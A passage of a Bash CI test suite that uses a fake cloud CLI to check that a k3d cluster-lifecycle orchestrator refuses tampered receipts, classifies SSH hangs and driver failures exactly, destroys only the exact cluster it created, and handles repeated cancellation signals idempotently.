  .namespace.destroy.receiptDigest == $lifecycle[0].destroy.receiptDigest and
  .namespace.absence.receiptDigest == $lifecycle[0].absence.receiptDigest and
  .namespace.policy.applied == true and .namespace.policy.hostileProbes == "Pass" and
  .cleanup.outcome == "Pass" and (.cleanup.debt // []) == []
' "$lifecycle_extract/ci-receipt.json" >/dev/null ||
  fail 'the terminal receipt is not bound to every passing lifecycle phase and digest'
ok 'mandatory receipt binds the exact cluster, create/destroy/absence Pass phases, digests, policy, and cleanup'

repack_lifecycle_bundle() {
  local source_bundle=${1:?source bundle required} target_bundle=${2:?target bundle required}
  local label=${3:?label required} mutation=${4-}
  local repack_dir=$scratch/repack-$label
  install -d -m 0700 "$repack_dir"
  tar -xf "$source_bundle" -C "$repack_dir"
  case $label in
    omitted-receipt) rm -f -- "$repack_dir/ci-receipt.json" ;;
    unexpected-member) printf '%s\n' hostile >"$repack_dir/notes.txt" ;;
    *)
      jq "$mutation" "$repack_dir/ci-receipt.json" >"$repack_dir/ci-receipt.json.tmp"
      mv "$repack_dir/ci-receipt.json.tmp" "$repack_dir/ci-receipt.json"
      ;;
  esac
  local -a members=(diene-environment-report.v1.json namespace-lifecycle.json checkpoint-chain.json)
  [[ $label == omitted-receipt ]] || members+=(ci-receipt.json)
  [[ $label != unexpected-member ]] || members+=(notes.txt)
  tar -cf "$target_bundle" -C "$repack_dir" "${members[@]}"
}

verify_lifecycle_bundle_case() (
  local selected_bundle=${1:?bundle required}
  cd -- "$work"
  FAKE_NSC_SCENARIO=happy ./scripts/ci/environment-k3d-run.sh lifecycle "$selected_bundle"
)

expect_terminal_bundle_refusal() {
  local reason=${1:?reason required} label=${2:?label required} mutation=${3-}
  local bundle=$scratch/lifecycle-$label.tar before
  repack_lifecycle_bundle "$happy_core_bundle" "$bundle" "$label" "$mutation"
  before=$(wc -l <"$happy_log")
  expect_refusal "$reason" verify_lifecycle_bundle_case "$bundle"
  [[ $(wc -l <"$happy_log") == "$before" ]] ||
    fail "$label terminal verifier invoked Namespace authority"
}

expect_terminal_bundle_refusal EvidenceCollectionFailed omitted-receipt
expect_terminal_bundle_refusal ReceiptLifecycleIncomplete foreign-cluster \
  '.namespace.clusterId = "cluster-foreign-terminal"'
expect_terminal_bundle_refusal ReceiptLifecycleIncomplete foreign-allocation \
  '.owner.allocationKey = "r99999-w99999-a9-lditto-build-local"'
expect_terminal_bundle_refusal ReceiptLifecycleIncomplete foreign-generation \
  '.owner.generationKey = "gffffffffffff"'
expect_terminal_bundle_refusal ReceiptLifecycleIncomplete create-phase \
  '.namespace.create.outcome = "Fail" | .namespace.create.reasonCode = "Tampered"'
expect_terminal_bundle_refusal ReceiptLifecycleIncomplete destroy-digest \
  '.namespace.destroy.receiptDigest = "sha256:9999999999999999999999999999999999999999999999999999999999999999"'
expect_terminal_bundle_refusal ReceiptLifecycleIncomplete absence-phase \
  '.namespace.absence = {outcome:"Pending",reasonCode:"AbsenceNotAttempted"}'
expect_terminal_bundle_refusal ReceiptLifecycleIncomplete cleanup-debt \
  '.cleanup = {outcome:"Fail",reasonCode:"ExactDownFailed",debt:["tampered debt"]}'
expect_terminal_bundle_refusal ReceiptLifecycleIncomplete receipt-unpatched \
  '.namespace.policy.applied = false | .namespace.policy.hostileProbes = "Pending" |
   .cleanup = {outcome:"Pending",reasonCode:"RuntimeArmed",debt:[]}'
expect_terminal_bundle_refusal EvidenceCollectionFailed unexpected-member

terminal_receipt_link=$scratch/terminal-receipt-link.json
ln -s "$lifecycle_extract/ci-receipt.json" "$terminal_receipt_link"
validate_terminal_receipt_case() (
  cd -- "$work"
  # shellcheck source=/dev/null
  source ./scripts/ci/environment-lib.sh
  diene_validate_terminal_receipt "$terminal_receipt_link" \
    "$lifecycle_extract/namespace-lifecycle.json" \
    "$lifecycle_extract/checkpoint-chain.json" \
    "$lifecycle_extract/diene-environment-report.v1.json"
)
expect_refusal ReceiptLifecycleIncomplete validate_terminal_receipt_case
ok 'omission, owner/allocation/generation/cluster, phase, digest, cleanup, Pending, symlink, and extra-member terminal receipts all refuse'

destroy_before=$(grep -Ec '^destroy ' "$happy_log")
(cd -- "$work" && FAKE_NSC_SCENARIO=happy ./scripts/ci/environment-k3d-run.sh cleanup) \
  >"$scratch/cleanup.out" 2>"$scratch/cleanup.err" || {
  sed -n '1,120p' "$scratch/cleanup.err" >&2
  fail 'normal always-step cleanup did not re-prove convergence'
}
[[ $(grep -Ec '^destroy ' "$happy_log") == "$destroy_before" ]] ||
  fail 'normal always-step cleanup destroyed an already-converged instance twice'
assert_contains "$scratch/cleanup.out" 'NamespaceLifecycleConverged:'
ok 'the separate always-step re-proves absence without a duplicate destroy'

run_happy_lane 4002 ditto-target-pull
cp "$LAST_REPORT" "$scratch/happy-target-pull.json"
run_happy_lane 4003 absol
assert_not_contains "$LAST_LOG" '--cache'
run_happy_lane 4004 fleet-independence
assert_not_contains "$LAST_LOG" '--cache'
run_happy_lane 4005 ditto-vendor
happy_vendor_report=$scratch/happy-vendor.json
cp "$LAST_REPORT" "$happy_vendor_report"
grep -Fq 'vendor_report_digest=sha256:' "$GITHUB_OUTPUT" || fail 'vendor output digest is absent'
! grep -Fq 'core_report_digest=' "$GITHUB_OUTPUT" || fail 'vendor run opened the core output namespace'
run_happy_lane 4006 ditto-vendor vendor-unavailable
jq -e '.outcome == "Unavailable" and .vendorOutcome.outcome == "Unavailable" and
  .vendorOutcome.required == false and .namespaceLifecycle.outcome == "Pass"' "$LAST_REPORT" >/dev/null ||
  fail 'optional provider unavailability was not nonblocking and separately explicit'
ok 'all five lanes converge; optional vendor unavailability alone remains nonblocking'

printf '== lifecycle phase failures stay red and exact ==\n'

expect_lifecycle_failure() {
  local run_id=${1:?run id required} scenario=${2:?scenario required} reason=${3:?reason required}
  prepare_run "$run_id"
  case $scenario in
    remote-source-special) export FAKE_HOSTILE_SOURCE_ARCHIVE="$hostile_archive_dir/fifo.tar" ;;
    proof-fifo | proof-unreadable) printf '%s\n' stale-proof-sentinel >"$DIENE_PROOF_BUNDLE" ;;
  esac
  local nsc_root=$FAKE_NSC_ROOT rc
  if run_orchestrator "$scenario" >"$scratch/failure-$scenario.out" 2>"$scratch/failure-$scenario.err"; then
    fail "$scenario unexpectedly passed"
  else
    rc=$?
  fi
  ((rc != 0)) || fail "$scenario returned a green status"
  grep -Fq -- "$reason" "$scratch/failure-$scenario.err" || {
    sed -n '1,160p' "$scratch/failure-$scenario.err" >&2
    fail "$scenario did not retain $reason"
  }
  if grep -Eq '^destroy .*diene_|^destroy .*\*|^destroy .*--label' "$FAKE_NSC_LOG"; then
    fail "$scenario attempted prefix or broad cleanup"
  fi
  FAILURE_NSC_ROOT=$nsc_root
  FAILURE_LOG=$FAKE_NSC_LOG
  FAILURE_RUNNER=$RUNNER_TEMP
  ok "$scenario remains red with $reason"
}

expect_lifecycle_failure 5001 create-fail NamespaceCreateFailed
! find "$FAILURE_NSC_ROOT/instances" -name live -print -quit | grep -q . ||
  fail 'a failed create unexpectedly left a modeled live instance'
! grep -Eq '^destroy ' "$FAILURE_LOG" || fail 'failed create guessed an identity to destroy'

expect_lifecycle_failure 5002 transfer-fail NamespaceTransferFailed
transfer_id=$(find "$FAILURE_NSC_ROOT/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
[[ $(grep -Ec "^destroy --force ${transfer_id} " "$FAILURE_LOG") == 1 ]] ||
  fail 'transfer failure did not destroy its exact cluster once'
[[ ! -e $FAILURE_NSC_ROOT/instances/$transfer_id/live ]] || fail 'transfer failure left its cluster live'

expect_lifecycle_failure 5003 ssh-fail NamespaceSshDriverFailed
ssh_id=$(find "$FAILURE_NSC_ROOT/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
[[ $(grep -Ec "^destroy --force ${ssh_id} " "$FAILURE_LOG") == 1 ]] ||
  fail 'SSH failure did not destroy its exact cluster once'
[[ ! -e $FAILURE_NSC_ROOT/instances/$ssh_id/live ]] || fail 'SSH failure left its cluster live'
# An ordinary driver failure is not a hang: it is never retried, and it never
# borrows the timeout class.
[[ $(grep -Ec "^ssh ${ssh_id} -T -- " "$FAILURE_LOG") == 1 ]] ||
  fail 'a non-timeout driver failure was retried against the same cluster'
assert_not_contains "$scratch/failure-ssh-fail.err" NamespaceSshSessionStartTimedOut
assert_not_contains "$scratch/failure-ssh-fail.err" NamespaceSshDriverTimedOut
ok 'a non-timeout driver failure is never retried and never claims a timeout class'

# A session that never proves it started is not a driver failure and is not a
# hang: it is its own fail-closed class, and it is not retried either.
expect_lifecycle_failure 5144 ssh-unmarked-zero NamespaceSshSessionStartUnproven
ssh_unproven_id=$(find "$FAILURE_NSC_ROOT/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
[[ $(grep -Ec "^ssh ${ssh_unproven_id} -T -- " "$FAILURE_LOG") == 1 ]] ||
  fail 'a zero exit without the ready marker was retried'
[[ $(grep -Ec "^destroy --force ${ssh_unproven_id} " "$FAILURE_LOG") == 1 ]] ||
  fail 'an unproven session start did not destroy its exact cluster once'
ok 'a zero exit without the ready marker fails closed as unproven and is never retried'

# ssh-fail above emits the marker first, so it only covers a MARKED ordinary
# failure. An unmarked non-timeout exit is the other half: it is neither a
# session-start hang nor an unproven zero, so it must still be the ordinary
# driver-failure class and must still not buy a session retry.
expect_lifecycle_failure 5150 ssh-unmarked-fail NamespaceSshDriverFailed
ssh_unmarked_fail_id=$(find "$FAILURE_NSC_ROOT/instances" -name meta.json \
  -exec jq -r '.cluster_id' {} \;)
[[ $(grep -Ec "^ssh ${ssh_unmarked_fail_id} -T -- " "$FAILURE_LOG") == 1 ]] ||
  fail 'an unmarked non-timeout driver failure was retried'
[[ $(grep -Ec "^destroy --force ${ssh_unmarked_fail_id} " "$FAILURE_LOG") == 1 &&
  ! -e $FAILURE_NSC_ROOT/instances/$ssh_unmarked_fail_id/live ]] ||
  fail 'an unmarked non-timeout driver failure did not destroy its exact cluster once'
grep -Eq '^list --all -o json ' "$FAILURE_LOG" ||
  fail 'an unmarked non-timeout driver failure did not positively prove absence'
assert_not_contains "$scratch/failure-ssh-unmarked-fail.err" NamespaceSshSessionStartTimedOut
assert_not_contains "$scratch/failure-ssh-unmarked-fail.err" NamespaceSshSessionStartUnproven
ok 'an unmarked non-timeout exit stays the ordinary driver-failure class and is never retried'

# Once the session is proven started, a later hang is a DRIVER timeout, a
# different class, and it must not buy another session attempt.
for ssh_marked_case in 'ssh-marked-timeout|5145' 'ssh-marked-kill|5146'; do
  ssh_marked_scenario=${ssh_marked_case%%|*}
  ssh_marked_run=${ssh_marked_case#*|}
  expect_lifecycle_failure "$ssh_marked_run" "$ssh_marked_scenario" NamespaceSshDriverTimedOut
  ssh_marked_id=$(find "$FAILURE_NSC_ROOT/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
  [[ $(grep -Ec "^ssh ${ssh_marked_id} -T -- " "$FAILURE_LOG") == 1 ]] ||
    fail "$ssh_marked_scenario retried a driver timeout that had already proven its session start"
  ssh_marked_staging=$(find "$FAILURE_RUNNER/diene-namespace" -path '*/staging/stderr' -print -quit)
  [[ -z $ssh_marked_staging ]] ||
    ! grep -q '^NamespaceSshSessionStartTimedOut: ' "$ssh_marked_staging" ||
    fail "$ssh_marked_scenario recorded a session-start hang for a proven-started session"
done
ok 'a hang after the ready marker is a driver timeout, a distinct class, and buys no session retry'

# The marker is accepted only as the first complete stdout line.
expect_lifecycle_failure 5147 ssh-preceding-output NamespaceSshSessionStartTimedOut
ok 'output preceding the ready marker does not satisfy the first-complete-line rule'
expect_lifecycle_failure 5148 ssh-partial-marker NamespaceSshSessionStartTimedOut
ok 'an unterminated ready marker does not satisfy the first-complete-line rule'

# The binding ruling: an nsc SSH hang retries the SAME live instance, is free,
# and is a distinct signature from readiness exhaustion. These cases prove the
# retry happens, that it costs no create, and that it can then pass.
ssh_retry_recovery_case() {
  local run_id=${1:?run id required} scenario=${2:?scenario required} rc=${3:?timeout rc required}
  prepare_run "$run_id"
  run_orchestrator "$scenario" >"$scratch/ssh-retry-$scenario.out" \
    2>"$scratch/ssh-retry-$scenario.err" || {
    sed -n '1,160p' "$scratch/ssh-retry-$scenario.err" >&2
    fail "$scenario did not recover after its session hang"
  }
  local cluster
  cluster=$(find "$FAKE_NSC_ROOT/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
  [[ $(grep -Ec "^ssh ${cluster} -T -- " "$FAKE_NSC_LOG") == 2 ]] ||
    fail "$scenario did not retry exactly once against the same exact cluster"
  [[ $(grep -Ec '^create ' "$FAKE_NSC_LOG") == 1 ]] ||
    fail "$scenario consumed a second create for a session hang"
  [[ $(find "$FAKE_NSC_ROOT/instances" -mindepth 1 -maxdepth 1 -type d | wc -l) == 1 ]] ||
    fail "$scenario created a second instance for a session hang"
  jq -e '
    .namespaceLifecycle.ssh.outcome == "Pass" and
    .namespaceLifecycle.ssh.reasonCode == "NonInteractiveDriverCompletedAfterSshSessionRetry" and
    .outcome == "Pass"
  ' "$DIENE_CORE_REPORT" >/dev/null ||
    fail "$scenario did not record a recovered pass distinct from a first-attempt pass"
  local staging_stderr
  staging_stderr=$(find "$RUNNER_TEMP/diene-namespace" -path '*/staging/stderr' -print -quit)
  [[ -n $staging_stderr ]] || fail "$scenario retained no staging stderr evidence"
  grep -Fxq -- \
    "NamespaceSshSessionStartTimedOut: exact cluster_id $cluster attempt 1/2 did not emit DieneNscSshSessionReady:v1 before 30s (status $rc)" \
    "$staging_stderr" ||
    fail "$scenario did not append the exact stable session-hang marker for attempt 1"
  [[ $(grep -Ec '^NamespaceSshSessionStartTimedOut: ' "$staging_stderr") == 1 ]] ||
    fail "$scenario appended a session-hang marker for an attempt that did not hang"
  ok "$scenario retries the same exact cluster once, costs no create, and then passes"
}
ssh_retry_recovery_case 5140 ssh-start-timeout-once 124
ssh_retry_recovery_case 5141 ssh-start-timeout-kill-once 137

# A marker that only appears after the watchdog already gave up -- emitted from
# the child's own TERM handler during the kill-after window -- is not evidence
# that the session started in time. An unconditional post-reap scan would
# upgrade this attempt to ready and reclassify a session-start hang as a driver
# timeout, silently destroying the same-ID retry the ruling requires. The final
# scan is valid only for a child observed to have exited between polls.
ssh_retry_recovery_case 5149 ssh-late-marker 124
ssh_late_marker_staging=$(find "$RUNNER_TEMP/diene-namespace" -path '*/staging/stdout' -print -quit)
[[ -n $ssh_late_marker_staging ]] ||
  fail 'the late-marker case retained no staging stdout to prove the marker was really emitted'
[[ $(grep -Fxc 'DieneNscSshSessionReady:v1' "$ssh_late_marker_staging") == 2 ]] ||
  fail 'the late-marker case did not actually emit a post-deadline marker, so it proves nothing'
ok 'a marker emitted only after the watchdog expired never upgrades the attempt to ready'

expect_lifecycle_failure 5142 ssh-start-timeout-always NamespaceSshSessionStartTimedOut
ssh_timeout_id=$(find "$FAILURE_NSC_ROOT/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
[[ $(grep -Ec "^ssh ${ssh_timeout_id} -T -- " "$FAILURE_LOG") == 2 ]] ||
  fail 'exhausted session hangs did not spend exactly the two bounded attempts'
[[ $(grep -Ec '^create ' "$FAILURE_LOG") == 1 ]] ||
  fail 'exhausted session hangs consumed a second create'
[[ $(grep -Ec "^destroy --force ${ssh_timeout_id} " "$FAILURE_LOG") == 1 &&
  ! -e $FAILURE_NSC_ROOT/instances/$ssh_timeout_id/live ]] ||
  fail 'exhausted session hangs did not destroy their exact cluster exactly once'
grep -Eq '^list --all -o json ' "$FAILURE_LOG" ||
  fail 'exhausted session hangs did not prove absence after their exact destroy'
ssh_timeout_staging=$(find "$FAILURE_RUNNER/diene-namespace" -path '*/staging/stderr' -print -quit)
[[ $(grep -Ec '^NamespaceSshSessionStartTimedOut: ' "$ssh_timeout_staging") == 2 ]] ||
  fail 'exhausted session hangs did not append one stable marker per bounded attempt'
grep -Fxq -- \
  "NamespaceSshSessionStartTimedOut: exact cluster_id $ssh_timeout_id attempt 2/2 did not emit DieneNscSshSessionReady:v1 before 120s (status 124)" \
  "$ssh_timeout_staging" ||
  fail 'the final session-hang marker does not name the exact cluster and bounded attempt'
ok 'exhausted session hangs are a distinct stable reason with exact destroy and proven absence'

expect_lifecycle_failure 5143 ssh-start-timeout-then-fail NamespaceSshDriverFailed
ssh_mixed_id=$(find "$FAILURE_NSC_ROOT/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
[[ $(grep -Ec "^ssh ${ssh_mixed_id} -T -- " "$FAILURE_LOG") == 2 ]] ||
  fail 'a hang followed by a driver failure did not spend exactly two bounded attempts'
[[ $(grep -Ec '^create ' "$FAILURE_LOG") == 1 ]] ||
  fail 'a hang followed by a driver failure consumed a second create'
assert_contains "$scratch/failure-ssh-start-timeout-then-fail.err" NamespaceSshDriverFailed
ok 'a hang whose retry fails for another reason keeps the ordinary driver-failure class'

expect_lifecycle_failure 5004 collection-fail EvidenceCollectionFailed
collection_id=$(find "$FAILURE_NSC_ROOT/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
[[ $(grep -Ec "^destroy --force ${collection_id} " "$FAILURE_LOG") == 1 ]] ||
  fail 'download failure did not destroy its exact cluster once'
[[ ! -e $FAILURE_NSC_ROOT/instances/$collection_id/live ]] || fail 'download failure left its cluster live'

expect_lifecycle_failure 5007 proof-fifo EvidenceCollectionFailed
[[ ! -e $DIENE_CORE_REPORT && ! -e $DIENE_PROOF_BUNDLE ]] ||
  fail 'a special collected proof left a report or stale proof artifact publishable'
assert_contains "$scratch/failure-proof-fifo.err" EvidenceLeakageInterfaceUnavailable
proof_fifo_id=$(find "$FAILURE_NSC_ROOT/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
[[ $(grep -Ec "^destroy --force ${proof_fifo_id} " "$FAILURE_LOG") == 1 ]] ||
  fail 'special collected proof did not preserve exact cleanup'

expect_lifecycle_failure 5008 proof-unreadable EvidenceCollectionFailed
[[ ! -e $DIENE_CORE_REPORT && ! -e $DIENE_PROOF_BUNDLE ]] ||
  fail 'an unreadable collected tree left a report or stale proof artifact publishable'
assert_contains "$scratch/failure-proof-unreadable.err" EvidenceLeakageInterfaceUnavailable
ok 'special and unreadable proof members suppress all artifacts after exact cleanup'

expect_lifecycle_failure 5009 remote-source-special NamespaceSshDriverFailed
remote_stderr=$(find "$FAILURE_RUNNER/diene-namespace" -path '*/staging/stderr' -print -quit)
[[ -n $remote_stderr ]] && assert_contains "$remote_stderr" UntrustedSubject
remote_special_id=$(find "$FAILURE_NSC_ROOT/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
[[ $(grep -Ec "^destroy --force ${remote_special_id} " "$FAILURE_LOG") == 1 ]] ||
  fail 'remote archive revalidation failure did not preserve exact cleanup'
ok 'the uploaded fixed validator repeats source safety before remote extraction'

prepare_run 5010
printf '%s\n' stale-proof-sentinel >"$DIENE_PROOF_BUNDLE"
export DIENE_GREP_BIN=$fake_grep_error
if run_orchestrator happy >"$scratch/failure-grep-error.out" 2>"$scratch/failure-grep-error.err"; then
  fail 'a leakage scanner status 2 unexpectedly published a green lifecycle'
fi
assert_contains "$scratch/failure-grep-error.err" EvidenceLeakageInterfaceUnavailable
[[ ! -e $DIENE_CORE_REPORT && ! -e $DIENE_PROOF_BUNDLE ]] ||
  fail 'grep status 2 left a final report or pre-existing proof sentinel'
grep_error_id=$(find "$FAKE_NSC_ROOT/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
[[ $(grep -Ec "^destroy --force ${grep_error_id} " "$FAKE_NSC_LOG") == 1 ]] ||
  fail 'leakage scanner failure did not preserve exact cleanup'
ok 'grep status 2 preserves interface-unavailable and removes every stale publication artifact'

expect_lifecycle_failure 5005 destroy-fail NamespaceDestroyFailed
destroy_id=$(find "$FAILURE_NSC_ROOT/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
[[ $(grep -Ec "^destroy --force ${destroy_id} " "$FAILURE_LOG") == 1 ]] ||
  fail 'destroy failure did not retain its exact destructive selector'
[[ -e $FAILURE_NSC_ROOT/instances/$destroy_id/live ]] ||
  fail 'the destroy-failure model incorrectly claimed the instance absent'
assert_contains "$scratch/failure-destroy-fail.err" 'NamespaceAbsenceUnproven'

expect_lifecycle_failure 5006 list-fail NamespaceAbsenceUnproven
list_id=$(find "$FAILURE_NSC_ROOT/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
[[ $(grep -Ec "^destroy --force ${list_id} " "$FAILURE_LOG") == 1 ]] ||
  fail 'list failure did not destroy its exact cluster once'
[[ ! -e $FAILURE_NSC_ROOT/instances/$list_id/live ]] || fail 'list failure left its cluster live'
grep -Eq '^list --all -o json ' "$FAILURE_LOG" || fail 'list failure never attempted positive absence'
ok 'all modeled lifecycle phase failures preserve exact-id cleanup semantics'

printf '== identity mismatch, driver failure, and cancellation ==\n'

expect_lifecycle_failure 5101 cid-mismatch NamespaceIdentityMismatch
cid_mismatch_id=$(find "$FAILURE_NSC_ROOT/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
[[ -e $FAILURE_NSC_ROOT/instances/$cid_mismatch_id/live ]] ||
  fail 'cid mismatch did not remain visible as TTL-backed cleanup debt'
! grep -Eq '^destroy ' "$FAILURE_LOG" ||
  fail 'cid mismatch guessed between disagreeing identities and destroyed one'
ok 'cidfile/metadata disagreement refuses without broad or guessed cleanup'

expect_lifecycle_failure 5102 driver-fail DriverFailed
driver_id=$(find "$FAILURE_NSC_ROOT/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
[[ $(grep -Ec "^destroy --force ${driver_id} " "$FAILURE_LOG") == 1 ]] ||
  fail 'driver failure did not destroy its exact cluster once'
[[ ! -e $FAILURE_NSC_ROOT/instances/$driver_id/live ]] || fail 'driver failure left its cluster live'
jq -e '.outcome == "Fail" and .namespaceLifecycle.destroy.outcome == "Pass" and
  .namespaceLifecycle.absence.outcome == "Pass"' "$DIENE_CORE_REPORT" >/dev/null ||
  fail 'driver failure was rewritten green by successful cleanup'
ok 'driver failure remains red after exact destroy and absence both pass'

cancel_lifecycle() {
  local run_id=${1:?run id required} signal=${2:?signal required} expected=${3:?status required}
  prepare_run "$run_id"
  local pidfile=$scratch/cancel-$signal.pid killer rc cluster
  (
    local attempt pid=''
    for ((attempt = 0; attempt < 200; attempt++)); do
      [[ ! -s $pidfile ]] || read -r pid <"$pidfile"
      if [[ -n $pid ]] && grep -Eq '^ssh ' "$FAKE_NSC_LOG"; then
        kill -s "$signal" "$pid"
        exit 0
      fi
      sleep 0.05
    done
    exit 1
  ) &
  killer=$!
  if (
    cd -- "$work"
    printf '%s\n' "$BASHPID" >"$pidfile"
    exec env FAKE_NSC_SCENARIO=ssh-delay ./scripts/ci/environment-k3d-run.sh orchestrate
  ) >"$scratch/cancel-$signal.out" 2>"$scratch/cancel-$signal.err"; then
    wait "$killer" || true
    fail "$signal cancellation unexpectedly passed"
  else
    rc=$?
  fi
  wait "$killer" || fail "$signal cancellation was not injected during SSH"
  [[ $rc == "$expected" ]] || fail "$signal cancellation returned $rc, expected $expected"
  assert_contains "$scratch/cancel-$signal.err" OrchestratorCancelled
  cluster=$(find "$FAKE_NSC_ROOT/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
  [[ $(grep -Ec "^destroy --force ${cluster} " "$FAKE_NSC_LOG") == 1 ]] ||
    fail "$signal cancellation did not destroy its exact cluster once"
  [[ ! -e $FAKE_NSC_ROOT/instances/$cluster/live ]] || fail "$signal cancellation left its cluster live"
  jq -e '.outcome == "Fail" and .reasonCode == "OrchestratorCancelled" and
    .namespaceLifecycle.destroy.outcome == "Pass" and .namespaceLifecycle.absence.outcome == "Pass"' \
    "$DIENE_CORE_REPORT" >/dev/null || fail "$signal cancellation report lost its original red result"
  ! find "$RUNNER_TEMP" \( -path '*/gnu-toolchain/identity.json' -o -name 'preflight.json' \) \
    -print -quit | grep -q . ||
    fail "$signal cancellation retained a green guest toolchain identity or preflight record"
  # A signal is not a session hang. The bounded retry must not begin another
  # attempt once the trap has taken control, and the cancellation must keep its
  # own reason rather than borrowing the session-timeout class.
  [[ $(grep -Ec "^ssh ${cluster} -T -- " "$FAKE_NSC_LOG") == 1 ]] ||
    fail "$signal cancellation began a bounded ssh retry after the trap took control"
  assert_not_contains "$scratch/cancel-$signal.err" NamespaceSshSessionStartTimedOut
  # Record how much cancellation evidence ONE signal produces, so the repeated
  # signal cases below can prove a second signal adds nothing rather than
  # guessing at an absolute line count.
  case $signal in
    TERM) CANCEL_BASELINE_TERM=$(grep -Fc OrchestratorCancelled "$scratch/cancel-$signal.err" || true) ;;
    INT) CANCEL_BASELINE_INT=$(grep -Fc OrchestratorCancelled "$scratch/cancel-$signal.err" || true) ;;
  esac
  ok "$signal cancellation remains red after exact cleanup"
}

cancel_lifecycle 5110 TERM 143
cancel_lifecycle 5111 INT 130

# The cancellation contract rests on two Bash facts, proved here directly
# rather than inferred from a second default signal: an EXIT trap survives a
# signal handler that calls exit, and `trap '' SIG` inside that handler makes a
# repeated signal a no-op instead of restoring the default disposition. If the
# handler used `trap - SIG` instead, the second signal would kill the process
# mid-wait and skip exact destroy and absence entirely.
cancel_exit_semantics=$scratch/cancel-exit-semantics.sh
cat >"$cancel_exit_semantics" <<'CANCEL_EXIT_SEMANTICS'
#!/usr/bin/env bash
marker=${1:?marker required}
: >"$marker"
finalize() {
  trap - EXIT
  trap '' TERM INT HUP
  printf 'exit-finalizer\n' >>"$marker"
}
on_signal() {
  trap '' TERM INT HUP
  printf 'signal-handler\n' >>"$marker"
  sleep 2
  printf 'signal-handler-survived\n' >>"$marker"
  exit 143
}
trap finalize EXIT
trap on_signal TERM INT HUP
printf 'ready\n' >>"$marker"
sleep 30
CANCEL_EXIT_SEMANTICS
chmod 0755 "$cancel_exit_semantics"
cancel_exit_marker=$scratch/cancel-exit-semantics.marker
"$BASH" "$cancel_exit_semantics" "$cancel_exit_marker" >/dev/null 2>&1 &
cancel_exit_pid=$!
cancel_exit_waited=0
while ! grep -Fxq ready "$cancel_exit_marker" 2>/dev/null &&
  ((cancel_exit_waited < 100)); do
  cancel_exit_waited=$((cancel_exit_waited + 1))
  sleep 0.05
done
grep -Fxq ready "$cancel_exit_marker" || fail 'the EXIT-semantics probe never armed its traps'
kill -s TERM "$cancel_exit_pid"
sleep 0.3
kill -s TERM "$cancel_exit_pid" 2>/dev/null || true
kill -s INT "$cancel_exit_pid" 2>/dev/null || true
cancel_exit_rc=0
wait "$cancel_exit_pid" || cancel_exit_rc=$?
[[ $cancel_exit_rc == 143 ]] ||
  fail "a repeated signal preempted the suppressed handler (got $cancel_exit_rc)"
[[ $(grep -Fxc signal-handler "$cancel_exit_marker") == 1 ]] ||
  fail 'the suppressed signal handler re-entered on a repeated signal'
grep -Fxq signal-handler-survived "$cancel_exit_marker" ||
  fail 'a repeated signal killed the handler during its stop wait'
[[ $(grep -Fxc exit-finalizer "$cancel_exit_marker") == 1 ]] ||
  fail 'the EXIT finalizer did not run exactly once after the handler exited'
ok 'a suppressed signal handler survives repeated signals and its EXIT finalizer still runs once'

# The same contract, now against the real orchestrator while the tracked child
# refuses to die on TERM, so the stop helper is genuinely inside its fixed
# kill-after window when the second signal lands.
cancel_lifecycle_repeated() {
  local run_id=${1:?run id required} first=${2:?first signal required}
  local second=${3:?second signal required} expected=${4:?status required}
  local label=$first-then-$second
  prepare_run "$run_id"
  local pidfile=$scratch/cancel-$label.pid killer rc cluster staging_stdout
  : >"$pidfile"
  (
    local attempt pid=''
    for ((attempt = 0; attempt < 600; attempt++)); do
      [[ ! -s $pidfile ]] || read -r pid <"$pidfile"
      if [[ -n $pid ]] && grep -Eq '^ssh ' "$FAKE_NSC_LOG"; then
        kill -s "$first" "$pid"
        # Synchronize on observable handler entry rather than a blind sleep.
        # OrchestratorCancelled is written only after the handler has already
        # installed its ignore for TERM INT HUP, so waiting for it guarantees
        # the second signal is genuinely second. A blind delay could let the
        # second signal be dispatched first and make an injector race look
        # like production re-entry.
        local entered=0 settle
        for ((settle = 0; settle < 400; settle++)); do
          if grep -Fq OrchestratorCancelled "$scratch/cancel-$label.err" 2>/dev/null; then
            entered=1
            break
          fi
          sleep 0.05
        done
        ((entered == 1)) || exit 2
        kill -s "$second" "$pid" 2>/dev/null || true
        sleep 0.2
        kill -s "$second" "$pid" 2>/dev/null || true
        exit 0
      fi
      sleep 0.05
    done
    exit 1
  ) &
  killer=$!
  if (
    cd -- "$work"
    printf '%s\n' "$BASHPID" >"$pidfile"
    exec env FAKE_NSC_SCENARIO=ssh-hostile-signal ./scripts/ci/environment-k3d-run.sh orchestrate
  ) >"$scratch/cancel-$label.out" 2>"$scratch/cancel-$label.err"; then
    wait "$killer" || true
    fail "$label repeated cancellation unexpectedly passed"
  else
    rc=$?
  fi
  wait "$killer" || fail "$label repeated cancellation was not injected, or the first signal handler never announced itself"
  [[ $rc == "$expected" ]] ||
    fail "$label repeated cancellation returned $rc, expected the first signal's $expected"
  local baseline
  case $first in
    TERM) baseline=${CANCEL_BASELINE_TERM:-0} ;;
    INT) baseline=${CANCEL_BASELINE_INT:-0} ;;
    *) fail "$label repeated cancellation has no single-signal baseline" ;;
  esac
  [[ $baseline -ge 1 ]] ||
    fail "$label repeated cancellation has no single-signal baseline to compare against"
  # Idempotence is the property under test: a second signal must add no further
  # cancellation evidence beyond what one signal already produced.
  [[ $(grep -Fc OrchestratorCancelled "$scratch/cancel-$label.err" || true) == "$baseline" ]] ||
    fail "$label repeated cancellation recorded more cancellation evidence than a single signal"
  cluster=$(find "$FAKE_NSC_ROOT/instances" -name meta.json -exec jq -r '.cluster_id' {} \;)
  [[ $(grep -Ec "^ssh ${cluster} -T -- " "$FAKE_NSC_LOG") == 1 ]] ||
    fail "$label repeated cancellation began another ssh attempt"
